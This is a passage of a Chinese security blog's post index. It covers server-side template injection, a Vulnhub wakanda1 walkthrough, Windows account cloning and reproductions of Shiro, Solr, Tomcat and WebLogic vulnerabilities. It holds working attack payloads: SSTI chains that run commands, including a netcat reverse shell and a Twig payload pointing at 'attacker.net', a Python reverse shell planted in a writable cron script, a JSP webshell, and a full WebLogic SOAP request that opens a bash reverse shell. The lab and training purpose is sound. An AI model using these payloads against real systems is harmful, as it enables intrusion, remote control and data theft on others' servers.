任意文件下载后：读配置文件；通过配置文件信息搜集：当前运行该用户的操作历史，该用户运行的其他服务其他服务下的配置文件；读取源码（java的xxe可以列目录，java读web.xml，网鼎杯青龙组CTF题目filejava） ajax 异步请求：前端判定不能抓包（抓不到响应包） 手机抓包：charles 微信网页：特殊的user-agent，可以发包","link":"/2020/05/15/src/"},{"title":"SSR 服务端&#x2F;客户端","text":"服务端： 1wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh 客户端： 12https://github.com/shadowsocksrr/shadowsocksrhttps://github.com/shadowsocksrr/shadowsocksr-android","link":"/2019/11/27/ssr/"},{"title":"SSTI 总结","text":"服务端模板注入（Server-Side Template Injection） 模板网站开发时经常会使用一种模板技术，由模板控制前端的显示。 不使用模板： 123456from flask import Flaskapp = Flask(__name__)@app.route('/user/&lt;name&gt;')def user(name): return '&lt;h1&gt;Hello, {}!&lt;/h1&gt;'.format(name) 使用模板： 123456from flask import Flask, render_templateapp = Flask(__name__)@app.route('/user/&lt;name&gt;')def user(name): return render_template('user.html', name=name) user.html: 1&lt;h1&gt;Hello, {{ name }}!&lt;/ht&gt; 模板除了这样简单的替换功能，还支持更高级的功能。比如从一个字典、列表甚至对象中获取变量，可以对变量使用过滤器，提供控制结构和宏，支持扩展和继承。 常见模板引擎 PHP: Smarty, Twig, Blade JAVA: JSP, FreeMarker, Velocity Python: Jinja2, django, tornado 模板注入注入产生的原因是混淆程序和数据 PHP - Twig存在漏洞版本 1234567&lt;?phprequire_once dirname(__FILE__).‘/../lib/Twig/Autoloader.php‘;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {$_GET[‘name‘]}&quot;); // 将用户输入作为模版内容的一部分echo $output; 修复版本： 123456&lt;?phprequire_once dirname(__FILE__).‘/../lib/Twig/Autoloader.php‘;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello {{name}}&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); // 将用户输入作为模版变量的值echo $output; Python - Jinja2存在漏洞： 1234567891011@app.errorhandler(404)def page_not_found(e): template = '''{%% extends &quot;layout.html&quot; %%}{%% block body %%} &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt;{%% endblock %%}''' % (request.url) return render_template_string(template), 404 检测在可能存在 SSTI 的地方使用 1{{ 1+1 }} 类似这样的 payload，如果能在页面上看到返回了 2，就说明表达式能够执行，可以模板注入。 攻击利用模板特性SmartySmarty 提供了安全模式，只能执行白名单中的PHP函数，但我们可以从模板本身入手。 $smarty内置类可以用于访问环境变量，使用self就可以得到这个类，它提供了一些好用的方法，比如getStreamVariable()，可以获取传入变量的流（读文件） 1{self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)} class Smarty_Internal_Write_File，有一个writeFile函数，可以写文件 1{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET['cmd']); ?&gt;&quot;,self::clearConfig())} TwigTwig 无法调用静态方法，并且所有函数的返回值都转换为字符串。但是提供了一个_self，有一个env，指Twig_Environment对象，有一个setCache方法，可以改变Twig尝试加载和执行编译模板的位置，可以通过将缓存位置设置为远程服务器进行远程文件包含。 12{{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}} 但是这个 payload 需要打开allow_url_include，所以换用getFilter方法，其中调用了call_user_function方法 12{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}} FreeMarker1&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; ${ ex(&quot;id&quot;) } 利用框架特性Django123http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY} Flask - Jinja2config 是 Flask 框架中的一个全局对象，代表当前配置对象flask config，包含了所有应用程序的配置值。包含一些方法：from_envvar，from_object，from_pyfile，root_path。 123456{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') }}//写文件{{ config.from_pyfile('/tmp/evil') }}//加载system{{ config['SHELL']('nc xxxx xx -e /bin/sh') }}//执行命令反弹SHELL Tornado1http://117.78.26.79:31093/error?msg={{handler.settings}} 利用语言特性Python需要绕过沙盒机制，[一篇博文](http://www.k0rz3n.com/2018/05/04/Python 沙盒逃逸备忘/) Java123${T(java.lang.System).getenv()}${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} 防御 过滤用户输入 不要直接使用格式化字符串，或者使用正规的模板渲染方法","link":"/2020/05/10/ssti/"},{"title":"Todo List","text":"服务外包 渗透靶场、靶机 树莓派 Kali nethunter","link":"/2019/10/06/todolist/"},{"title":"利用 vulhub 搭建漏洞复现环境","text":"vulhub 是一个面向大众的开源漏洞靶场，基于 docker 和 docker-compose，方便漏洞复现。 安装 docker 1curl -s https://get.docker.com | sh 为 docker 换源，编辑/etc/docker/daemon.json： 12345{ &quot;rigistry-mirrors&quot; : [ &quot;http://registry.docker-cn.com&quot;, &quot;http://docker.mirrors.ustc.edu.cn&quot;} 安装 docker-compose 1pip install docker-compose 下载 vulhub 1git clone https://github.com/vulhub/vulhub.git 进入相应漏洞文件夹，执行docker-compose up -d，即可打开漏洞环境 执行docker-compose down 关闭环境或docker-compose down -v删除环境","link":"/2020/05/08/vulhub/"},{"title":"常用逆向工具快捷键","text":"Ollydbg IDA dbg 快捷键 ollydbg 快捷键 功能 F2 设置断点 F8 单步步过，遇到子程序不进入 F7 单步步入，遇到子程序进入 F4 运行到选定位置，到光标位置暂停 Ctrl+F9 执行到返回，执行到ret语句时暂停 ALT+F9 执行到用户代码 IDA 快捷键 功能 Space 切换反汇编窗口（列表和图形） ESC 和Enter 反野 G 定位地址 X 交叉引用 TAB 汇编和伪代码切换 N 重命名 Y 修改函数原型或者变量类型 双击 转到定义 ;和: 分号注释所有交叉参考处都会出现，冒号只在该处出现 小键盘+和- 在代码和关系图之间切换 F5 显示C伪代码 * 变量重定义为数组 Ctrl+S 搜索类型选择 Alt+T 文本搜索 Alt+I 立即数搜索 Alt+B 二进制搜索 Shift+F12 字符串窗口，可以搜索字符串 D 数据类型转换 dd，dw，db R 转换成字符 H 十进制和十六进制转换 P 创建函数 Shift+S 快速创建结构体 A 解释光标的地址为字符串首地址 Alt+A 设置字符串实现格式，可以使用UTF8 Ctrl+E 查看函数模板表，DLL Entry Point Alt+* 设置数组大小 dbg 命令 功能 file &lt;filename&gt; 载入文件 r run，运行程序 c continue，继续执行 b &lt;行号/函数名称/*函数名称/*代码地址&gt; breakpoint，其中*函数名称表示断电设置在有编译器生成的prolog代码处 d &lt;编号&gt; delete breakpoint，删除断点 s step into，单步步入，遇到调用进入被调函数 n step over，单步步过，遇到调用不会进入 si 类似s，针对汇编指令 ni 类似n，针对汇编指令 p &lt;变量名&gt; print，显示指定变量 display 指定程序中断后显示的数据及格式 undisplay 取消display设置 i info，显示各类信息 q quit，退出调试环境 help &lt;命令&gt; 帮助","link":"/2019/10/07/tools/"},{"title":"Vulnhub靶机-wakanda1","text":"靶机下载 用Virtualbox导入靶机时出现错误Implementation of the USB 2.0 controller not found!，到官网安装Oracle VM VirtualBox Extension Pack即可解决。 使用了virtualbox中的kali。 信息收集靶机和kali都用桥接模式，在同一局域网中。使用ip a查看Kali的IP地址和子网掩码 1234567891011121: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 08:00:27:b5:85:ee brd ff:ff:ff:ff:ff:ff inet 192.168.1.101/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0 valid_lft 86120sec preferred_lft 86120sec inet6 fe80::a00:27ff:feb5:85ee/64 scope link noprefixroute valid_lft forever preferred_lft forever 用nmap查看同一局域网的存活主机。nmap -sP 192.168.1.101/24 12345678910111213141516Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-17 17:32 CSTNmap scan report for 192.168.1.1 (192.168.1.1)Host is up (0.0015s latency).MAC Address: B4:DE:DF:5D:FE:70 (Unknown)Nmap scan report for 192.168.1.2 (192.168.1.2)Host is up (0.0030s latency).MAC Address: FC:7C:02:9C:00:59 (Unknown)Nmap scan report for laptop-lkst0l6r (192.168.1.3)Host is up (0.00040s latency).MAC Address: 00:0E:C6:BB:D2:3F (Asix Electronics)Nmap scan report for wakanda1 (192.168.1.4)Host is up (0.00073s latency).MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)Nmap scan report for k (192.168.1.101)Host is up.Nmap done: 256 IP addresses (5 hosts up) scanned in 1.97 seconds 其中靶机是wakanda1（192.168.1.4），kali是k（192.168.1.101），物理机是laptop（192.168.1.3） 扫描一下端口，看看有什么服务。 12345678910111213nmap -sS -p- 192.168.1.4Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-17 15:18 CSTNmap scan report for wakanda1 (192.168.1.4)Host is up (0.00020s latency).Not shown: 65531 closed portsPORT STATE SERVICE80/tcp open http111/tcp open rpcbind3333/tcp open dec-notes44362/tcp open unknownMAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 3.80 seconds 80端口有一个web服务，3333是ssh端口 漏洞探测用Nikto扫描网站漏洞 1234567891011121314151617181920nikto -h http://192.168.1.4- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.1.4+ Target Hostname: 192.168.1.4+ Target Port: 80+ Start Time: 2020-01-17 15:30:03 (GMT8)---------------------------------------------------------------------------+ Server: Apache/2.4.10 (Debian)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ OSVDB-3233: /icons/README: Apache default file found.+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host+ End Time: 2020-01-17 15:30:55 (GMT8) (52 seconds)---------------------------------------------------------------------------+ 1 host(s) tested 在nikto里没有看到有用的信息，再使用dirb枚举目录。 1234567891011121314151617181920212223242526dirb http://192.168.1.4-----------------DIRB v2.22 By The Dark Raver-----------------START_TIME: Fri Jan 17 15:32:17 2020URL_BASE: http://192.168.1.4/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.1.4/ ----+ http://192.168.1.4/admin (CODE:200|SIZE:0) + http://192.168.1.4/backup (CODE:200|SIZE:0) + http://192.168.1.4/index.php (CODE:200|SIZE:1527) + http://192.168.1.4/secret (CODE:200|SIZE:0) + http://192.168.1.4/server-status (CODE:403|SIZE:299) + http://192.168.1.4/shell (CODE:200|SIZE:0) -----------------END_TIME: Fri Jan 17 15:32:19 2020DOWNLOADED: 4612 - FOUND: 6 访问了admin,backup等url，没有得到信息。 查看index.php源码，发现一行注释 1&lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt; 说明index.php有切换语言的功能，可以接受lang参数，可能存在文件包含。 漏洞利用尝试利用php伪协议读index 1http://192.168.1.4/index.php?lang=php://filter/convert.base64-encode/resource=index 得到了编码的index.php 1PD9waHAKJHBhc3N3b3JkID0iTmlhbWV5NEV2ZXIyMjchISEiIDsvL0kgaGF2ZSB0byByZW1lbWJlciBpdAoKaWYgKGlzc2V0KCRfR0VUWydsYW5nJ10pKQp7CmluY2x1ZGUoJF9HRVRbJ2xhbmcnXS4iLnBocCIpOwp9Cgo/PgoKCgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IlZpYnJhbml1bSBtYXJrZXQiPgogICAgPG1ldGEgbmFtZT0iYXV0aG9yIiBjb250ZW50PSJtYW1hZG91Ij4KCiAgICA8dGl0bGU+VmlicmFuaXVtIE1hcmtldDwvdGl0bGU+CgoKICAgIDxsaW5rIGhyZWY9ImJvb3RzdHJhcC5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CgogICAgCiAgICA8bGluayBocmVmPSJjb3Zlci5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgPC9oZWFkPgoKICA8Ym9keSBjbGFzcz0idGV4dC1jZW50ZXIiPgoKICAgIDxkaXYgY2xhc3M9ImNvdmVyLWNvbnRhaW5lciBkLWZsZXggdy0xMDAgaC0xMDAgcC0zIG14LWF1dG8gZmxleC1jb2x1bW4iPgogICAgICA8aGVhZGVyIGNsYXNzPSJtYXN0aGVhZCBtYi1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8aDMgY2xhc3M9Im1hc3RoZWFkLWJyYW5kIj5WaWJyYW5pdW0gTWFya2V0PC9oMz4KICAgICAgICAgIDxuYXYgY2xhc3M9Im5hdiBuYXYtbWFzdGhlYWQganVzdGlmeS1jb250ZW50LWNlbnRlciI+CiAgICAgICAgICAgIDxhIGNsYXNzPSJuYXYtbGluayBhY3RpdmUiIGhyZWY9IiMiPkhvbWU8L2E+CiAgICAgICAgICAgIDwhLS0gPGEgY2xhc3M9Im5hdi1saW5rIGFjdGl2ZSIgaHJlZj0iP2xhbmc9ZnIiPkZyL2E+IC0tPgogICAgICAgICAgPC9uYXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvaGVhZGVyPgoKICAgICAgPG1haW4gcm9sZT0ibWFpbiIgY2xhc3M9ImlubmVyIGNvdmVyIj4KICAgICAgICA8aDEgY2xhc3M9ImNvdmVyLWhlYWRpbmciPkNvbWluZyBzb29uPC9oMT4KICAgICAgICA8cCBjbGFzcz0ibGVhZCI+CiAgICAgICAgICA8P3BocAogICAgICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2xhbmcnXSkpCiAgICAgICAgICB7CiAgICAgICAgICBlY2hvICRtZXNzYWdlOwogICAgICAgICAgfQogICAgICAgICAgZWxzZQogICAgICAgICAgewogICAgICAgICAgICA/PgoKICAgICAgICAgICAgTmV4dCBvcGVuaW5nIG9mIHRoZSBsYXJnZXN0IHZpYnJhbml1bSBtYXJrZXQuIFRoZSBwcm9kdWN0cyBjb21lIGRpcmVjdGx5IGZyb20gdGhlIHdha2FuZGEuIHN0YXkgdHVuZWQhCiAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICB9Cj8+CiAgICAgICAgPC9wPgogICAgICAgIDxwIGNsYXNzPSJsZWFkIj4KICAgICAgICAgIDxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLWxnIGJ0bi1zZWNvbmRhcnkiPkxlYXJuIG1vcmU8L2E+CiAgICAgICAgPC9wPgogICAgICA8L21haW4+CgogICAgICA8Zm9vdGVyIGNsYXNzPSJtYXN0Zm9vdCBtdC1hdXRvIj4KICAgICAgICA8ZGl2IGNsYXNzPSJpbm5lciI+CiAgICAgICAgICA8cD5NYWRlIGJ5PGEgaHJlZj0iIyI+QG1hbWFkb3U8L2E+PC9wPgogICAgICAgIDwvZGl2PgogICAgICA8L2Zvb3Rlcj4KICAgIDwvZGl2PgoKCgogIAoKPC9ib2R5PjwvaHRtbD4= 解码后得到了密码 123456789&lt;?php$password =&quot;Niamey4Ever227!!!&quot; ;//I have to remember itif (isset($_GET['lang'])){include($_GET['lang'].&quot;.php&quot;);}?&gt; 网站没有后台，尝试用这个密码登录ssh，一开始登录root，登录不上。在网站首页找到Made by[@mamadou](http://192.168.1.4/#)，登录mamadou成功。 获取信息登录后默认的shell是python，切换到bash 12import ptypty.spawn(&quot;/bin/bash&quot;) 找找flag 1find / -name &quot;*flag*&quot; 看到home的mamadou和devops里有flag1和flag2。flag1可以直接读，flag2提示permission denied。尝试sudo，提示mamadou不在suders file（当然）。 在/tmp下看到一个test文件 12345678910ls /tmp -latotal 32drwxrwxrwt 7 root root 4096 Jan 17 03:23 .drwxr-xr-x 22 root root 4096 Aug 1 2018 ..drwxrwxrwt 2 root root 4096 Jan 16 22:18 .font-unixdrwxrwxrwt 2 root root 4096 Jan 16 22:18 .ICE-unix-rw-r--r-- 1 devops developer 4 Jan 17 03:33 testdrwxrwxrwt 2 root root 4096 Jan 16 22:18 .Test-unixdrwxrwxrwt 2 root root 4096 Jan 16 22:18 .X11-unixdrwxrwxrwt 2 root root 4096 Jan 16 22:18 .XIM-unix 可以看到test是由devops创建的，时间明显晚于其他文件，猜测有程序定期生成test文件（？），在/srv下找到了这个文件（？），.antivirus.py。 12345678910ls /srv -latotal 12drwxr-xr-x 2 root root 4096 Aug 1 2018 .drwxr-xr-x 22 root root 4096 Aug 1 2018 ..-rw-r--rw- 1 devops developer 36 Aug 1 2018 .antivirus.pycat /srv/.antivirus.pyopen('/tmp/test','w').write('test') 这个文件所有人都可以修改，可以修改内容反弹shell。在文件后加入内容 12345678import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;192.168.1.101&quot;,1235))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]) 在攻击机上监听1235端口 1nc -lvvp 1235 等了一会得到了devpos的shell，可以读到flag2了。 提权查看devops的权限 12345678sudo -lsudo -lMatching Defaults entries for devops on Wakanda1: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser devops may run the following commands on Wakanda1: (ALL) NOPASSWD: /usr/bin/pip 无密码只能运行pip，可以利用fakepip提权，其实只要利用phpstudy就行。 下载好setup.py，把LHOST改为kali的ip，放到phpstudy网站根目录，在kali上监听端口，然后在windows上下载setup.py并利用fakepip反弹shell即可。 1root@k:~$ nc -lvvp 13372 12devops@wakanda1:~$ wget http://192.168.1.3/setup.pydevops@wakanda1:~$ sudo /usr/bin/pip install . --upgrade --force-reinstall 在kali上会收到root的shell，第三个flag在/root/root.txt 参考文章：FreeBuf文章","link":"/2020/01/17/wakanda1/"},{"title":"Windows 服务器安全","text":"Windows 安全架构安全配置账号安全策略设置用户账户用户账户分为本地和全局两种，全局用户可在网络上任意计算机上登录。 Windows 常用内置账户有 Guest（低权限） 和 Administrator（高权限），可以改名，不能删除。 组用于简化系统管理，通过组可以一次性位一批用户设置权限。 内置组账号：Administrators, Users, Guests, Backup Operators, Replicator, * Operators(Print Account, Server), Domain *(Administrators, Users, Guests), Network, Interactive, Everyone 组分为本地组，全剧组和特殊组。全剧组分为三类，管理员组(Domain Admins)，用户组(Domain Users)，访客组(Domain Guests)。特别组不能通过用户管理器增加新成员，也不能被浏览和修改，有 System(操作系统), Creator owner(创建对对象拥有所有权的用户), Interactive(以交互方式在本地系统登录入网的所有哦用户), Network(系统中通过网络连接的所有用户), Everyone(登录上网的系统中的所有用户，相当于Interactive+Network，所有登陆账户都是Everyone组的成员)。 账户安全管理对于用户账户，应设置尽量小的权限。对于系统管理员，应妥善管理和设置口令。 应把性质相同的用户分在同一组，便于管理。 账号克隆和SIDSID，安全标识符，唯一标识用户、组和计算机账户。Windows系统使用SID区分用户。 通过对注册表的 HKEY_LOCAL_MACHIENE\\SAM\\SAM\\Domains\\Account\\Users\\ 下的子健操作可以克隆账户（需要System权限），可以使一个普通用户拥有与Administrator同样的权限。 账号克隆过程：打开CMD输入 net user beifeng$ 123 /add，$可以隐藏用户。这个用户在cmd的net user里看不到，但是可以在计算机管理中看到。进入注册表 HKEY_LOCAL_MACHIENE\\SAM\\SAM\\Domains\\account\\user\\names\\beifeng$。将项beifeng$、上层目录中与beifeng$对应的000003f1、与Administrator对应的000001f4导出为.reg，打开两个reg文件，将Administrator用户对应的000001f4下的键F的值复制，覆盖beifeng$对应的项000003f1下的F的值。删除beifeng$用户（net user beifeng$ /del），再把beifeng$.reg和000003f1.reg导入，设置密码（net user beifeng$ 123），完成克隆。 入侵者克隆时一般选择已有的账号进行克隆，比如aspnet, guest等，通过本地管理员检查工具枚举账户可以发现 这样的克隆管理员。 账号枚举Windows默认允许任何用户通过空用户得到系统所有账号和共享列表，得到用户名后暴力破解密码可以进行登录。 防止方式：控制面板，管理工具，本地安全策略选项，Windows设置，安全设置，本地策略，安全选项。将网络访问，不允许SAM账户的匿名枚举和网络访问，不允许SAM和共享的匿名枚举启用。 其他设置 Administrator账户更名。 不显示上次登陆过的用户名。控制面板，管理工具，本地安全策略，本地策略，安全选项。启用登陆屏幕上不要显示上次登录过的用户名。 强制Windows口令的复杂性。本地计算机策略，计算机配置，Windows设置，安全设置，账户策略，密码策略。 检查组和账号。我的电脑，管理，计算机管理，本地用户与组。或者通过cmd的net user命令。","link":"/2020/02/26/windows-security/"},{"title":"漏洞复现","text":"复现一些常见并且影响范围广的漏洞 Apache Shiro Java反序列化漏洞 (CVE-2016-4437, Shiro550)简介Apache Shiro 默认使用 CookieRememberMeManager，其处理 cookie 的流程是：得到 rememberMe 的 cookie 值，base64 解码，AES 解密，反序列化。AES的密钥是硬编码的，攻击者可以构造恶意数据造成反序列化的 RCE 漏洞。 影响范围 Apache Shiro &lt; 1.2.5 环境搭建使用 vulhub 中的漏洞环境，用admin:vulhub登录。 漏洞利用使用 ShiroExploit，一路下一步即可命令执行。 Apache Solr 远程命令执行(CVE-2019-0193)简介Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。 影响范围 Apache Solr 5.x - 8.2.0 存在 config API 版本 环境搭建使用 vulhub 靶机 漏洞利用创建了一个名为 test 的 core 节点，此漏洞利用的前提是知道 core 的名称。 漏洞产生原因是能够直接访问 solr 控制台，通过发送类似solr/节点名/config的POST请求对该节点的配置文件做更改，能进入控制台能看见 core 节点的名称。也可以尝试访问/solr/admin/aores能看见创建的全部 core 节点的名称。 python2脚本，CVE-2019-0193.py： 1python CVE-2019-0193.py http://192.168.67.145:8983/ &quot;pwd&quot; Apache Tomcat 文件包含漏洞 (CVE-2020-1938，幽灵猫)简介Apache Tomcat 会开启 AJP 连接器，方便与其他 web 服务器通过 AJP 协议进行交互，由于 Tomcat 本身也内涵 HTTP 服务器，因此也可以视为一个单独的 web 服务器。 攻击者可以利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，包括 webapp 配置文件和源代码等。 影响范围 Apache Tomcat 9.x &lt; 9.0.31 Apache Tomcat 8.x &lt; 8.5.51 Apache Tomcat 7.x &lt; 7.0.100 Apache Tomcat 6.x 环境搭建使用 vulhub 中的漏洞环境（tomcat 9.0.30），靶机地址192.168.67.144（NAT）。 漏洞利用12345678$ nmap -sV 192.168.67.144Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-17 19:31 CSTNmap scan report for 192.168.67.144Host is up (0.0013s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION8009/tcp open ajp13 Apache Jserv (Protocol v1.3)8080/tcp open http Apache Tomcat 9.0.30 POC： 12345https://github.com/00theway/Ghostcat-CNVD-2020-10487 # 可RCEhttps://github.com/0nise/CVE-2020-1938https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC # 本文使用https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scannerhttps://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/ CVE-2020-1938.py ，CVE-2020-1938-requirements.txt 12$ pip install -r CVE-2020-1938-requirments.txt$ python CVE-2020-1938.py -p 8009 -f &quot;/WEB-INF/web.xml“ 192.168.67.144 可配合文件上传 RCE，需要有上传点且已知路径。 Apache Tomcat 弱口令简介Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。 环境搭建使用 vulhub 靶机 漏洞利用访问 http://ip:8080/manager/html，输入弱口令tomcat:tomcat 在 WAR file to deploy 中上传小马，内容： 123456789101112&lt;% if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[1024]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(&quot;&lt;/pre&gt;&quot;); } %&gt; 压缩为 zip 文件，并将后缀名改为 war，上传。 访问http://ip:8080/shell/shell.jsp?pwd=123&amp;cmd=ls成功执行 ls Weblogic XML Decoder 反序列化(CVE-2017-10271)简介Weblogic是oracle推出的application server，由于其具有支持EJB、JSP、JMS、XML等多种语言、可扩展性、快速开发等多种特性，备受广大系统管理员的青睐。 CVE-2017-10271漏洞主要是由WebLogic Server WLS组件远程命令执行漏洞，主要由wls-wsat.war触发该漏洞，post数据包，通过构造构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞。 影响范围 Oracle WebLogic Server 10.3.6.0.0 Oracle WebLogic Server 12.1.3.0.0 Oracle WebLogic Server 12.2.1.1.0 环境搭建使用 vulhub 中的靶机 漏洞利用使用 vulhub 中的靶机 POST 请求（反弹shell）： 12345678910111213141516171819202122232425262728293031POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.9.1/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 写入 shell： 12345678910111213141516171819202122232425262728POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 638&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt; &lt;void method=&quot;println&quot;&gt;&lt;string&gt; &lt;![CDATA[&lt;% 